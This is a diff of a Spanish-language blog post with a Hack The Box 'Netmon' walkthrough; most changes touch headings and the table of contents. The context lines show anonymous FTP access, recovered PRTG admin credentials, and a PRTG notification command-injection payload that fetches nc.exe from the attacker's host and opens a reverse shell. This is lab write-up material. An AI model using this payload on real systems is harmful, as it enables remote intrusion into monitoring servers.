@@ -568,7 +568,7 @@
     
     var enableSearchHighlight = JSON.parse("true");
     
-    var searchResultPosition = JSON.parse("\"side\"");
+    var searchResultPosition = JSON.parse("\"main\"");
     
     var sectionType = JSON.parse("\"posts\"");
     
@@ -1578,9 +1578,11 @@
   🏷️
   
 
-  <li><a href="https://sckull.github.io/tags/ftp/" class="single__tag" title="ftp">#ftp</a></li>
+  <li><a href="https://sckull.github.io/tags/ftp/" class="single__tag" title="ftp">ftp</a></li>
+  
 
-  <li><a href="https://sckull.github.io/tags/prtg/" class="single__tag" title="PRTG">#PRTG</a></li>
+  <li><a href="https://sckull.github.io/tags/prtg/" class="single__tag" title="PRTG">PRTG</a></li>
+  
 
 </ul>
     </div>
@@ -1599,7 +1601,7 @@
     <img src="/images/posts/htb/netmon/cover.webp" alt="featured image" class="featured-image" style="width: ;height: ;">
   </div>
 
-<h3 id="informacion-de-la-maquina">Informacion de la Maquina</h3>
+<h1 id="informacion-de-la-maquina">Informacion de la Maquina</h1>
 <table>
 <thead>
 <tr>
@@ -1631,7 +1633,7 @@
 </tbody>
 </table>
 <hr />
-<h2 id="nmap-">NMAP</h2>
+<h1 id="nmap">NMAP</h1>
 <p>Al realizar un escaneo con nmap nos muestra servicios ftp, http y puertos de windows.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1759,7 +1761,7 @@ Host script results:
 Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 10.87 seconds
 </code></pre></td></tr></table>
 </div>
-</div><h2 id="ftp---puerto-21-">FTP - Puerto 21</h2>
+</div><h1 id="ftp---puerto-21">FTP - Puerto 21</h1>
 <p>Con las credenciales anonymous:anonymous obtenemos acceso y tambien la bandera <code>user.txt</code>.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1887,10 +1889,11 @@ root@sckull:~# cat user.txt
 dd58ce67b49e15105e88096c8d9255a5
 </code></pre></td></tr></table>
 </div>
-</div><h2 id="enumeracion-ftp-">ENUMERACION FTP</h2>
+</div><h1 id="enumeracion-ftp">ENUMERACION FTP</h1>
 <p>Al realizar una enumeracion a los directorios por medio de ftp encontramos un programa llamado <code>PRTG Network Monitor</code> el cual funciona para monitoreo de red, el uso de ancho de banda o tiempo de actividad.</p>
 <p><img src="/images/posts/htb/netmon/Screenshot%20from%202019-03-11%2019-26-10.webp" alt="image" /></p>
-<h2 id="http---puerto-80-">HTTP - puerto 80</h2>
+<h1 id="http---puerto-80">HTTP - puerto 80</h1>
+<h2 id="prtg">PRTG</h2>
 <p><img src="/images/posts/htb/netmon/Screenshot%20from%202019-03-06%2013-19-49.webp" alt="image" /></p>
 <p>Realizando una busqueda por google nos encontramos con exploits para este monitor de red, pero para ello debemos de logearnos al portal web, el usuario y contraseña por default (prtgadmin:prtgadmin) no funcionan, por lo que yendo ún poco mas profundo encontramos un pequeño post en reddit que hablan acerca de un archivo &lsquo;PRTG Configuration.dat&rsquo; que puede contener contraseñas que no estan encriptadas de igual forma en archivo &lsquo;PRTG Configuration.old&rsquo;.</p>
 <p><a href="https://www.reddit.com/r/sysadmin/comments/862b8s/prtg_gave_away_some_of_your_passwords/"><strong>reddit/prtg_gave_away_some_of_your_passwords</strong></a></p>
@@ -1916,6 +1919,7 @@ dd58ce67b49e15105e88096c8d9255a5
 </div><p><img src="/images/posts/htb/netmon/Screenshot%20from%202019-03-11%2019-45-36.webp" alt="image" /></p>
 <p>Al intentar logearnos con las credenciales (<code>prtgadmin:PrTg@dmin2018</code>) el portal no nos deja, por lo que podemos ver el archivo en donde se encuentra la contraseña es un archivo backup y fue creado en el año de 2018, que tal si le cambiamos el año a la contraseña (<code>PrTg@admin2018</code>) al actual &ndash;&gt; <code>PrTg@dmin2018</code></p>
 <p><img src="/images/posts/htb/netmon/Screenshot%20from%202019-03-13%2016-55-17.webp" alt="image" /></p>
+<h2 id="prtg-command-injection">PRTG Command Injection</h2>
 <p>Tenemos una sesion abierta dentro del portal, ahora que estamos dentro podemos hacer inyeccion de comandos.</p>
 <p><a href="https://www.codewatch.org/blog/?p=453"><strong>PRTG &lt; 18.2.39 Command Injection Vulnerability</strong></a></p>
 <p><img src="/images/posts/htb/netmon/Screenshot%20from%202019-03-13%2017-07-17.webp" alt="image" /></p>
@@ -1931,7 +1935,8 @@ dd58ce67b49e15105e88096c8d9255a5
 <pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">C:</span><span class="p">\</span><span class="n">netcat</span><span class="p">.</span><span class="n">txt</span><span class="p">;</span><span class="n">powershell</span> <span class="n">-c</span> <span class="s2">&#34;wget http://10.10.12.122/nc.exe -OutFile C:\nc.exe; C:\nc.exe 10.10.12.122 7878 -e cmd&#34;</span>
 </code></pre></td></tr></table>
 </div>
-</div><p>Antes de ejecutar el comando debemos de poner a la escucha nuestra maquina para poder descargar <code>nc.exe</code> (netcat), luego de esto ejecutamos nuestra notificacion (test). Para ejecutarlo debemos de ir a donde esta la lista de notificaciones selecionamos la nuestra y en la parte derecha presionamos la campanita para hacer un test.</p>
+</div><h2 id="administrator---user">ADMINISTRATOR - USER</h2>
+<p>Antes de ejecutar el comando debemos de poner a la escucha nuestra maquina para poder descargar <code>nc.exe</code> (netcat), luego de esto ejecutamos nuestra notificacion (test). Para ejecutarlo debemos de ir a donde esta la lista de notificaciones selecionamos la nuestra y en la parte derecha presionamos la campanita para hacer un test.</p>
 <p><img src="/images/posts/htb/netmon/Screenshot%20from%202019-03-14%2005-13-58.webp" alt="image" /></p>
 <p><img src="/images/posts/htb/netmon/Screenshot%20from%202019-03-14%2006-00-43.webp" alt="image" /></p>
 <p>Observamos por medio del servicio ftp que el archivo <code>nc.exe</code> se creó exitosamente en <code>C:/nc.exe</code>.</p>
@@ -2045,7 +2050,7 @@ dd58ce67b49e15105e88096c8d9255a5
     </div>
     <div class="whoami__desc">
       
-        Pentester |&amp; Web Dev wannabe
+        Pentester/Web Dev wannabe
       
     </div>
     <div class="whoami__social">
@@ -3310,26 +3315,19 @@ document.addEventListener('DOMContentLoaded', function () {
               HTB:  Netmon
           </h6>
           
-          <label class="switch" data-ani="true">
-            <input id="visible-toc" aria-label="Visible TOC" type="checkbox" checked>
-            <span class="slider round"></span>
-          </label>
-          
         </div>
         <div class="toc toc__outer " data-dir="ltr" data-folding="false" data-ani="true">
           <nav id="TableOfContents">
   <ul>
-    <li>
+    <li><a href="#informacion-de-la-maquina">Informacion de la Maquina</a></li>
+    <li><a href="#nmap">NMAP</a></li>
+    <li><a href="#ftp---puerto-21">FTP - Puerto 21</a></li>
+    <li><a href="#enumeracion-ftp">ENUMERACION FTP</a></li>
+    <li><a href="#http---puerto-80">HTTP - puerto 80</a>
       <ul>
-        <li>
-          <ul>
-            <li><a href="#informacion-de-la-maquina">Informacion de la Maquina</a></li>
-          </ul>
-        </li>
-        <li><a href="#nmap-">NMAP</a></li>
-        <li><a href="#ftp---puerto-21-">FTP - Puerto 21</a></li>
-        <li><a href="#enumeracion-ftp-">ENUMERACION FTP</a></li>
-        <li><a href="#http---puerto-80-">HTTP - puerto 80</a></li>
+        <li><a href="#prtg">PRTG</a></li>
+        <li><a href="#prtg-command-injection">PRTG Command Injection</a></li>
+        <li><a href="#administrator---user">ADMINISTRATOR - USER</a></li>
       </ul>
     </li>
   </ul>
